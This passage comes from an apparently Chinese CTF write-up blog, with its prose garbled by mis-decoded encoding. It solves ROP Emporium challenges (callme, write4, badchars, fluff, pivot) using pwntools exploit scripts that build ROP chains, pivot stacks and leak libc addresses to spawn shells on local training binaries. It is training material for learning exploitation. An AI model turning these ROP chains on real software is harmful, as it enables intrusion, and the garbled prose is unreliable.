class="hljs-number">1</span>);&#125;</code></pre></div><p>è¿™ä¸ªæ˜¯å…³é”®å‡½æ•°ï¼Œä½†æ˜¯å…¶æ˜¯ç”¨åˆ°äº†ç»™çš„soæ–‡ä»¶ï¼Œç„¶åidaæ¥åˆ†æsoæ–‡ä»¶ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/FgKhVy.png" srcset="/img/loading.gif" alt><br>æ‰¾åˆ°ä»¥åå‘ç°åº”è¯¥æ˜¯æŒ‰ç…§é¡ºåºè°ƒç”¨<code>callme-oneï¼Œcallme-twoï¼Œcallme-three</code>éœ€è¦æ³¨æ„å…¶å‚æ•°éƒ½è¦æ˜¯1ï¼Œ2ï¼Œ3.å½“åˆç¨‹åºä¸­ç»™çš„æ˜¯4ï¼Œ5ï¼Œ6 éœ€è¦æƒ³åŠæ³•æ¥æ¢æ‰è¿™ä¸ªå‚æ•°ã€‚</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h4 id="32ä½ï¼š-1"><a href="#32ä½ï¼š-1" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./callme32'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)offset = <span class="hljs-number">44</span>callme_one = <span class="hljs-number">0x080485C0</span>callme_two = <span class="hljs-number">0x08048620</span>callme_three = <span class="hljs-number">0x080485B0</span>pop3_ret = <span class="hljs-number">0x080488a9</span>payload = <span class="hljs-string">'a'</span> * offset + p32(callme_one) + p32(pop3_ret) + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">2</span>) + p32(<span class="hljs-number">3</span>)payload += p32(callme_two) + p32(pop3_ret) + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">2</span>) + p32(<span class="hljs-number">3</span>)payload += p32(callme_three) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">2</span>) + p32(<span class="hljs-number">3</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.interactive()</code></pre></div><p>å…¶ä¸­<code>pop3_ret</code> æ˜¯ç”¨æ¥ä¿æŒæ ˆå¹³è¡¡çš„ï¼Œä¸”ç«™çš„ä½ç½®å‡½æ•°çš„è¿”å›åœ°å€ã€‚è¿˜æœ‰éœ€è¦æ³¨æ„çš„é—®é¢˜æ˜¯ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/9PV8oL.png" srcset="/img/loading.gif" alt><br>æ³¨æ„å¡«å……ä»¥åçš„è¿”å›åœ°å€å¡«çš„æ—¶å€™ï¼Œé€šå¸¸å¡«çš„æ˜¯ä»£ç æ®µçš„æ•°æ®ï¼Œä½†æ˜¯è¿™é‡Œæ±‡ç¼–æ˜¯<code>call</code>æ‰€ä»¥åœ¨å¡«çš„æ—¶å€™ï¼Œåº”è¯¥æ˜¯å¡«å……å…¶pltçš„åœ°å€ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/HxXaWe.png" srcset="/img/loading.gif" alt></p><h4 id="64ä½ï¼š-1"><a href="#64ä½ï¼š-1" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./callme'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)offset = <span class="hljs-number">40</span>callme_one = <span class="hljs-number">0x00401850</span>callme_two = <span class="hljs-number">0x000401870</span>callme_three = <span class="hljs-number">0x00401810</span>pop3_ret = <span class="hljs-number">0x0000000000401ab0</span>payload = <span class="hljs-string">'a'</span> * offset + p64(pop3_ret) + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">2</span>) + p64(<span class="hljs-number">3</span>) + p64(callme_one)payload += p64(pop3_ret) + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">2</span>) + p64(<span class="hljs-number">3</span>) + p64(callme_two)payload += p64(pop3_ret) + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">2</span>) + p64(<span class="hljs-number">3</span>) + p64(callme_three)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.interactive()</code></pre></div><p>åˆ©ç”¨ <code>0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret</code>è¿™ä¸ªgadgetæ¥æ§åˆ¶å‚æ•°ã€‚</p><h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><h3 id="idaåˆ†æ-3"><a href="#idaåˆ†æ-3" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>è¿™ä¸ªé¢˜è·Ÿå‰é¢ç¬¬2é¢˜å¾ˆåƒï¼Œä½†æ˜¯å°±æ˜¯æ²¡æœ‰ç»™ä½ <code>cat flag</code> çš„å­—ç¬¦ä¸²äº†ã€‚éœ€è¦è‡ªå·±ç”¨ç¨‹åºçš„gadgetæ¥æ„é€ ã€‚æ€è·¯ä¹Ÿå°±æ˜¯è¿›è¡ŒropæŠŠ<code>/bin/sh</code>å¾€bssæ®µä¸Šå†™,ç„¶åæ¥ç€æ‹¿shellå°±å¥½äº†ã€‚</p><div class="hljs"><pre><code class="hljs undefined">ROPgadget <span class="hljs-params">--binary</span> <span class="hljs-string">./write4</span> <span class="hljs-params">--only</span> <span class="hljs-string">"mov|pop|ret"</span></code></pre></div><p><strong>æŸ¥å¥½ç”¨çš„gadgetsï¼š</strong><br><img src="http://qiqianyun.chumen77.xyz/uPic/pY6tBk.png" srcset="/img/loading.gif" alt><br>åˆ©ç”¨è¿™å³å¯å°±å¯ä»¥äº†ï¼Œ32ä½çš„ç±»ä¼¼ã€‚</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><h4 id="32ä½ï¼š-2"><a href="#32ä½ï¼š-2" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./write432'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)elf = ELF(<span class="hljs-string">'./write432'</span>)<span class="hljs-comment"># bin_sh = elf.search('/bin/cat').next()</span>offset = <span class="hljs-number">44</span>bss = <span class="hljs-number">0x804A06C</span><span class="hljs-number">-0x10</span>pop_edi_pop_ebp_ret = <span class="hljs-number">0x080486da</span>system = <span class="hljs-number">0x8048430</span>key = <span class="hljs-number">0x08048670</span> <span class="hljs-comment">#mov dword ptr [edi], ebp ; ret</span>payload = <span class="hljs-string">'a'</span> * offset + flat([pop_edi_pop_ebp_ret,bss,<span class="hljs-string">'sh\x00\x00'</span>,key,system,<span class="hljs-number">0xdeadbeef</span>,bss])raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.interactive()</code></pre></div><h4 id="64ä½ï¼š-2"><a href="#64ä½ï¼š-2" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./write4'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)elf = ELF(<span class="hljs-string">'./write4'</span>)<span class="hljs-comment"># bin_sh = elf.search('/bin/cat').next()</span>offset = <span class="hljs-number">40</span>bss = <span class="hljs-number">0x601090</span><span class="hljs-number">-0x10</span>key1 = <span class="hljs-number">0x0000000000400820</span><span class="hljs-comment"># mov qword ptr [r14], r15 ; ret</span>key2 = <span class="hljs-number">0x0000000000400890</span><span class="hljs-comment"># pop r14 ; pop r15 ; ret</span>key3 = <span class="hljs-number">0x0000000000400893</span><span class="hljs-comment">#pop rdi ; ret</span>system = <span class="hljs-number">0x000004005E0</span>payload = <span class="hljs-string">'a'</span> * offset + flat([key2,bss,<span class="hljs-string">'/bin/sh\x00'</span>,key1,key3,bss,system])raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.interactive()</code></pre></div><h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><h3 id="idaåˆ†æ-4"><a href="#idaåˆ†æ-4" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>è¿™ä¸ªé¢˜ç›®è·Ÿå‰ä¸€ä¸ªwrite4ååˆ†çš„ç›¸ä¼¼ï¼Œä½†æ˜¯å…¶è¿‡æ»¤äº†ä¸ªåˆ«å­—ç¬¦ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/C2HXoN.png" srcset="/img/loading.gif" alt><br>ä¼šå°†å…¶æ›¿æ¢ä¸º<code>0xEB</code>ï¼Œä¸ªäººè§£å†³åŠæ³•å°±æ˜¯åœ¨bssæ®µå†™å¥½è¢«ç¨‹åºå¤„ç†è¿‡çš„å­—ç¬¦ä¸²åï¼Œåœ¨ç”¨xorçš„gadgetsæ¥é‡æ–°æ”¹å›æ¥ï¼Œä¸ºäº†ä¾¿äºåˆ©ç”¨ï¼Œ32ä½å’Œ64ä½éƒ½æ˜¯æ„é€ <code>system(sh)</code>æ¥æ‹¿çš„shellã€‚<br>ä¾‹å­ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/4tnNv7.png" srcset="/img/loading.gif" alt><br>ä¼ è¿‡å»çš„æ˜¯<code>sh\x00\x00\x00\x00\x00\x00\x00</code> åˆ°bssæ˜¯è¿™ä¸ªæƒ…å†µï¼Œç„¶åå»æ‰¾xorçš„gadgetï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/4OvcwS.png" srcset="/img/loading.gif" alt><br>å…¶ä¸­æ³¨æ„è¿™æ˜¯ä»¥ä¸€ä¸ªbyteæ¥è¿›è¡Œxorçš„ï¼Œç„¶åè¿™ä¸ªå›¾xorçš„å€’æ•°ç¬¬ä¸€æ¡è¯­å¥ï¼Œ**å…¶ä¸­çš„æ˜¯dhï¼Œè¿™ä¸ªæ˜¯edxçš„é«˜ä½ã€‚r14bæ˜¯r14çš„ä½ä½ä¹Ÿæ˜¯ä¸€ä¸ªbyteçš„å­—èŠ‚å•ä½ã€‚<br>è¿™ä¸ªé¢˜ç›®åœ¨gdbè°ƒè¯•expæ—¶ä¼šå‘ç°æœ‰æ¯”è¾ƒä¾¿æ·çš„åŠæ³•ã€‚</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><h4 id="32ä½ï¼š-3"><a href="#32ä½ï¼š-3" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./badchars32'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)elf = ELF(<span class="hljs-string">'./badchars32'</span>)key1 = <span class="hljs-number">0x08048893</span><span class="hljs-comment"># mov dword ptr [edi], esi ; ret</span>key2 = <span class="hljs-number">0x08048899</span><span class="hljs-comment"># pop esi ; pop edi ; ret</span>key3 = <span class="hljs-number">0x08048461</span><span class="hljs-comment"># pop ebx ; ret</span>bss = <span class="hljs-number">0x804A06C</span><span class="hljs-number">-10</span>key4 = <span class="hljs-number">0x08048897</span><span class="hljs-comment"># pop ecx ; ret</span>key5 = <span class="hljs-number">0x08048890</span><span class="hljs-comment">#xor byte ptr [ebx], cl ; ret</span>sys = <span class="hljs-number">0x080484E0</span>offset = <span class="hljs-number">44</span>payload = <span class="hljs-string">'a'</span> * offset + flat([key2,<span class="hljs-string">'sh\x00\x00'</span>,bss,key1,key3,bss,key4,<span class="hljs-number">0x98</span>,key5,sys,<span class="hljs-number">0xdeadbeef</span>,bss])raw_input(<span class="hljs-string">"-&gt;"</span>)io.sendline(payload)io.interactive()</code></pre></div><h4 id="64ä½ï¼š-3"><a href="#64ä½ï¼š-3" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./badchars'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)elf = ELF(<span class="hljs-string">'./badchars'</span>)offset = <span class="hljs-number">40</span>bss = <span class="hljs-number">0x6010B0</span>key1 = <span class="hljs-number">0x0000000000400b34</span><span class="hljs-comment"># mov qword ptr [r13], r12 ; ret</span>key2 = <span class="hljs-number">0x0000000000400b3b</span><span class="hljs-comment"># pop r12 ; pop r13 ; ret</span>key3 = <span class="hljs-number">0x0000000000400b39</span><span class="hljs-comment">#pop rdi ; ret</span>key4 = <span class="hljs-number">0x0000000000400b30</span><span class="hljs-comment">#xor byte ptr [r15], r14b ; ret</span>key5 = <span class="hljs-number">0x0000000000400b40</span><span class="hljs-comment">#pop r14 ; pop r15 ; ret</span>system = <span class="hljs-number">0x004006F0</span>payload = <span class="hljs-string">'a'</span> * offset + flat([key2,<span class="hljs-string">'sh\x00\x00\x00\x00\x00\x00'</span>,bss,key1,key5,<span class="hljs-number">0x98</span>,bss,key4,key3,bss,system])raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.interactive()</code></pre></div><h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>è¿™ä¸ªé¢˜ç›®è¿˜æ˜¯è·Ÿwrite4å¾ˆç›¸ä¼¼ï¼Œä½†æ˜¯æ‰¾å¯ç”¨çš„gadgetæ˜¯ï¼Œæ¯”è¾ƒéš¾æ‰¾ã€‚éœ€è¦æƒ³å°½åŠæ³•æ‰¾å„ç§gadgetï¼Œç„¶åå åŠ åœ¨ä¸€èµ·æˆä¸ºéœ€è¦çš„é“¾ã€‚è¿™ä¸ªé¢˜çªç ´å£ä¹Ÿå°±åœ¨ï¼š</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ecx</span>], <span class="hljs-built_in">edx</span> <span class="hljs-comment">; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret</span></code></pre></div><p>ç„¶åå†å»æ‰¾ecxï¼Œedxç›¸å…³çš„gadgetï¼Œé‡Œé¢ç”¨åˆ°äº†xorå’Œxchgç­‰ç›¸å…³çš„gadgetã€‚<br>å…¶ä¸­64ä½çš„æ‰¾å¯ç”¨gadgetï¼Œè¿˜éœ€è¦æ§åˆ¶ä¸€ä¸‹æ·±åº¦ï¼š</p><div class="hljs"><pre><code class="hljs undefined">ROPgadget <span class="hljs-params">--binary</span> <span class="hljs-string">./fluff</span> <span class="hljs-params">--depth</span> 15</code></pre></div><p>è¿™æ ·æ‰¾å‡ºè¶³å¤Ÿçš„gadgetï¼Œä»¥ä¾¿è‡ªå·±è¯•ç”¨ã€‚</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><h4 id="32ä½ï¼š-4"><a href="#32ä½ï¼š-4" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./fluff32'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)elf = ELF(<span class="hljs-string">'./fluff32'</span>)key1 = <span class="hljs-number">0x080483e1</span><span class="hljs-comment"># pop ebx ; ret</span>key2 = <span class="hljs-number">0x08048671</span><span class="hljs-comment"># xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret</span>key3 = <span class="hljs-number">0x0804867b</span><span class="hljs-comment"># xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret</span>bss = <span class="hljs-number">0x804A06C</span>key4 = <span class="hljs-number">0x08048689</span><span class="hljs-comment">#xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret</span>key5 = <span class="hljs-number">0x08048693</span><span class="hljs-comment"># mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret</span>sys = <span class="hljs-number">0x8048430</span>offset = <span class="hljs-number">44</span>payload = <span class="hljs-string">'a'</span> * offset + flat([key1,bss,key2,<span class="hljs-number">1</span>,key3,<span class="hljs-number">1</span>,key4,<span class="hljs-number">1</span>,key1,<span class="hljs-string">'sh\x00\x00'</span>,key2,<span class="hljs-number">1</span>,key3,<span class="hljs-number">1</span>,key5,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,sys,<span class="hljs-number">0xdeadbeef</span>,bss])raw_input(<span class="hljs-string">"-&gt;"</span>)io.sendline(payload)io.interactive()</code></pre></div><h4 id="64ä½ï¼š-4"><a href="#64ä½ï¼š-4" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./fluff'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)elf = ELF(<span class="hljs-string">'./fluff'</span>)key1 = <span class="hljs-number">0x0000000000400832</span><span class="hljs-comment"># pop r12 ; mov r13d, 0x604060 ; ret</span>key2 = <span class="hljs-number">0x0000000000400822</span><span class="hljs-comment">#xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret</span>key3 = <span class="hljs-number">0x000000000040082f</span><span class="hljs-comment">#xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret</span>bss = <span class="hljs-number">0x601090</span>key4 = <span class="hljs-number">0x0000000000400840</span><span class="hljs-comment">##  : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret</span>key5 = <span class="hljs-number">0x000000000040084e</span><span class="hljs-comment"># mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret</span>key6 = <span class="hljs-number">0x00000000004008c3</span><span class="hljs-comment"># pop rdi ; ret</span>sys = <span class="hljs-number">0x4005E0</span>offset = <span class="hljs-number">40</span>payload = <span class="hljs-string">'a'</span> * offset + flat([key1,bss,key2,<span class="hljs-number">1</span>,key3,<span class="hljs-number">1</span>,key4,<span class="hljs-number">1</span>,key1,<span class="hljs-string">'/bin/sh\x00'</span>,key2,<span class="hljs-number">1</span>,key3,<span class="hljs-number">1</span>,key5,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,key6,bss,sys])raw_input(<span class="hljs-string">"-&gt;"</span>)io.sendline(payload)io.interactive()</code></pre></div><h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>è¿™ä¸ªé¢˜ä¸€çœ‹å°±æ˜¯æ ˆè½¬ç§»äº†ã€‚</p><h3 id="idaåˆ†æ-5"><a href="#idaåˆ†æ-5" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/zf6UXd.png" srcset="/img/loading.gif" alt><br>å¯ä»¥çœ‹åˆ°ä¼šç»™ä½ æ³„æ¼ä¸€ä¸ªå †åœ°å€ï¼Œç»™ä½ å»æ ˆè½¬ç§»ã€‚<br>æ¥ç€çœ‹åé—¨å‡½æ•°ï¼Œå‘ç°è¿™é‡Œcallä¸€ä¸ªä¸libcè¿æ¥çš„å‡½æ•°ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/rdxJnU.png" srcset="/img/loading.gif" alt></p><p>æ¥ç€åˆ†æä¸€ä¸‹ç»™å®šçš„soæ–‡ä»¶ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/BkFCTM.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __<span class="hljs-function">noreturn <span class="hljs-title">ret2win</span><span class="hljs-params">()</span></span>&#123;  system(<span class="hljs-string">"/bin/cat flag.txt"</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre></div><p>æ¥ç€å°±æœ‰æ€è·¯äº†ï¼Œæ ˆè½¬ç§»åˆ°ç»™ä½ çš„å †åœ°å€ä¸Šï¼Œç„¶åæ„é€ ropé“¾ï¼š</p><ul><li>leak <code>foothold_function_got</code></li><li>ç®—å‡ºç»™çš„libcåŸºå€ï¼Œå›åˆ°startï¼Œå†æ¬¡åˆ©ç”¨æ¼æ´</li><li>æ„é€ jmpåˆ°ret2winçš„é“¾å³å¯<br>ä½†æ˜¯è¿™ä¸ªé¢˜ç›®è¿˜æ˜¯æœ‰æŠ€å·§çš„ï¼Œå‘ç°ç»™ä½ çš„å †åœ°å€å…¶å®è·Ÿè¿™ä¸ªlibcçš„å†…å­˜æ˜ å°„æ˜¯å¾ˆè¿‘çš„ï¼Œå¹¶ä¸”æ¯æ¬¡å·®è·ä¹Ÿæ˜¯å›ºå®šçš„ã€‚é‚£å°±å¯ä»¥ç›´æ¥åˆ†æsoæ–‡ä»¶ï¼Œæ¥ç®—å–åç§»ï¼Œç›´æ¥åˆ©ç”¨ã€‚</li></ul><p>æ ¹æ®ç»™çš„å †åœ°å€å’Œsoæ–‡ä»¶æ˜ å°„åŸºå€ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/6yPkYR.png" srcset="/img/loading.gif" alt></p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><h4 id="32ä½ï¼š-5"><a href="#32ä½ï¼š-5" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'i386'</span>context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./pivot32'</span>)elf = ELF(<span class="hljs-string">'./pivot32'</span>)libc = ELF(<span class="hljs-string">'./libpivot32.so'</span>)foothold_function_plt = elf.plt[<span class="hljs-string">'foothold_function'</span>]foothold_function_got = elf.got[<span class="hljs-string">'foothold_function'</span>]put_plt = elf.plt[<span class="hljs-string">'puts'</span>]key1 = <span class="hljs-number">0x080486a8</span> <span class="hljs-comment">#: leave ; ret</span>io.recvuntil(<span class="hljs-string">'0x'</span>)leak = int(io.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)print(<span class="hljs-string">'leak_stack'</span>+ hex(leak))io.recvuntil(<span class="hljs-string">'now and it will land there'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)payload = flat([<span class="hljs-number">0xdeadbeef</span>,foothold_function_plt,put_plt,<span class="hljs-number">0x08048640</span>,foothold_function_got])raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'stack smash'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)payload = <span class="hljs-number">40</span> * <span class="hljs-string">'a'</span> + p32(leak) +p32(key1)io.sendline(payload)io.recvuntil(<span class="hljs-string">'foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so'</span>)leak = u32(io.recv(<span class="hljs-number">4</span>))print(<span class="hljs-string">'leak'</span>+ hex(leak))ret2win = leak - libc.symbols[<span class="hljs-string">'foothold_function'</span>] + libc.symbols[<span class="hljs-string">'ret2win'</span>]io.recvuntil(<span class="hljs-string">'now and it will land there'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'1'</span>)io.recvuntil(<span class="hljs-string">'send your stack smash'</span>)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">44</span> + p32(ret2win)io.sendline(payload)io.interactive()</code></pre></div><h4 id="64ä½ï¼š-5"><a href="#64ä½ï¼š-5" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'amd64'</span>context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./pivot'</span>)elf = ELF(<span class="hljs-string">'./pivot'</span>)libc = ELF(<span class="hljs-string">'./libpivot.so'</span>)foothold_function_plt = elf.plt[<span class="hljs-string">'foothold_function'</span>]foothold_function_got = elf.got[<span class="hljs-string">'foothold_function'</span>]offset = libc.symbols[<span class="hljs-string">'foothold_function'</span>] - libc.symbols[<span class="hljs-string">'ret2win'</span>]put_plt = elf.plt[<span class="hljs-string">'puts'</span>]key1 = <span class="hljs-number">0x0000000000400a39</span> <span class="hljs-comment">#: leave ; ret</span>key2 = <span class="hljs-number">0x0000000000400b73</span><span class="hljs-comment">#pop rdi ; ret</span>key3 = <span class="hljs-number">0x0000000000400b02</span><span class="hljs-comment">#xchg rax, rsp ; ret</span>key4 = <span class="hljs-number">0x0000000000400b00</span><span class="hljs-comment">#pop rax ; ret</span>print(<span class="hljs-string">'offset:'</span> + hex(offset))io.recvuntil(<span class="hljs-string">'0x'</span>)leak = int(io.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)print(<span class="hljs-string">'leak_stack'</span>+ hex(leak))io.recvuntil(<span class="hljs-string">'now and it will land there'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)payload = flat([foothold_function_plt,key2,foothold_function_got,put_plt,<span class="hljs-number">0x004008A0</span>])raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'stack smash'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)payload = <span class="hljs-number">40</span> * <span class="hljs-string">'a'</span> + p64(key4)+ p64(leak) + p64(key3)io.sendline(payload)io.recvuntil(<span class="hljs-string">'foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so'</span>)leak = int(u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)))print(<span class="hljs-string">'leak'</span>+ hex(leak))ret2win = leak - libc.symbols[<span class="hljs-string">'foothold_function'</span>] + libc.symbols[<span class="hljs-string">'ret2win'</span>]print(<span class="hljs-string">'ret2win'</span>+ hex(ret2win))<span class="hljs-comment"># raw_input('-&gt;')</span>io.recvuntil(<span class="hljs-string">'&gt;'</span>)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">40</span> + p64(ret2win)io.sendline(payload)io.interactive()</code></pre></div><p>è¿™ä¸ªåœ°æ–¹å› ä¸ºæ˜¯fgetså‡½æ•°æ¥è·å–å­—ç¬¦ä¸²ï¼Œå…¶é‡åˆ°æ¢è¡Œå°±ä¼šç»“æŸï¼Œä½†æ˜¯åœ¨æ‰¾gadgat çš„æ—¶å€™å‘ç°<code>leave ret</code>çš„è¿™ä¸ªgadgetï¼Œåœ°å€éƒ½æ˜¯æœ‰<code>0x0a</code>,æ‰€ä»¥åªèƒ½æ›´æ¢gadgetï¼Œæ¥ä¼ªé€ æ ˆã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/bZjoUw.png" srcset="/img/loading.gif" alt></p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><h4 id="32ä½ï¼š-6"><a href="#32ä½ï¼š-6" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'i386'</span>context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./pivot32'</span>)elf = ELF(<span class="hljs-string">'./pivot32'</span>)offset = <span class="hljs-number">44</span>io.recvuntil(<span class="hljs-string">'0x'</span>)leak1 = int(io.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>) + <span class="hljs-number">1921272</span> + <span class="hljs-number">0x000000967</span>print(<span class="hljs-string">'leak'</span>+ hex(leak1))raw_input(<span class="hljs-string">'-&gt;'</span>)payload = offset * <span class="hljs-string">'a'</span> + p32(leak1)io.sendline(<span class="hljs-string">'1'</span>)io.recvuntil(<span class="hljs-string">'send your stack smash'</span>)io.sendline(payload)io.interactive()</code></pre></div><h4 id="64ä½ï¼š-6"><a href="#64ä½ï¼š-6" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'amd64'</span>context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./pivot'</span>)elf = ELF(<span class="hljs-string">'./pivot'</span>)libc = ELF(<span class="hljs-string">'./libpivot.so'</span>)offset = <span class="hljs-number">40</span>io.recvuntil(<span class="hljs-string">'0x'</span>)leak1 = int(io.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) + <span class="hljs-number">3977456</span> + libc.symbols[<span class="hljs-string">'ret2win'</span>]raw_input(<span class="hljs-string">'-&gt;'</span>)payload = offset * <span class="hljs-string">'a'</span> + p64(leak1)io.sendline(<span class="hljs-string">'1'</span>)io.recvuntil(<span class="hljs-string">'send your stack smash'</span>)io.sendline(payload)io.interactive()</code></pre></div><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>è¿™ä¸ªé¢˜ç›®å°±æ˜¯å†è€ƒret2csuï¼ˆ64ä½çš„ä¸‡èƒ½gadgetï¼‰ï¼Œè®©ä½ 